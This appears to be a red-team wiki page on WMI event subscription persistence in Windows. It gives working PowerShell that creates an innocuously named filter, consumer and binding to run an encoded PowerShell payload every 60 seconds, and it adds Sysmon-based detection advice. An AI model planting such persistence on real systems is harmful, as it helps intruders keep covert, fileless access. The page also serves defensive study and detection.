# WMI Event Subscription

WMI (Windows Management Instrumentation) event subscriptions let a script or command run automatically in response to a system event (a process starting, a time interval elapsing, a user logging on) — entirely within the WMI repository, with nothing written to disk as a traditional autorun entry. This makes it a popular fileless persistence technique.

## Why It Works

A WMI event subscription is made of three permanent WMI objects — an Event Filter (the trigger condition, in WQL), an Event Consumer (the action, e.g. run a command), and a Filter-to-Consumer Binding (linking them) — all stored in the WMI repository rather than the registry or filesystem, so it's invisible to tools that only check common autorun locations.

## Prerequisites

* Local admin rights (WMI persistent event subscriptions require elevated privileges to create)
* A trigger condition and a payload command line

## Execution

```powershell
# Event Filter: trigger every 60 seconds
$filterArgs = @{
  Name = 'UpdateFilter'
  EventNamespace = 'root\cimv2'
  QueryLanguage = 'WQL'
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Event Consumer: what to run
$consumerArgs = @{
  Name = 'UpdateConsumer'
  CommandLineTemplate = 'powershell.exe -enc <base64 payload>'
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Binding: link filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter; Consumer = $consumer }
```

{% hint style="warning" %}
Detection & Mitigation: Enable Sysmon Event IDs 19, 20, and 21 (WMI filter/consumer/binding activity) — this is the most reliable signal, since WMI subscriptions don't appear in Autoruns' default view without specifically enabling WMI checks. `Get-WmiObject -Namespace root\subscription -Class __EventFilter` can enumerate existing subscriptions for review.
{% endhint %}

## Related

* Scheduled Tasks — a more common, more heavily monitored alternative
* Registry Run Keys — simplest persistence, but far more scrutinized
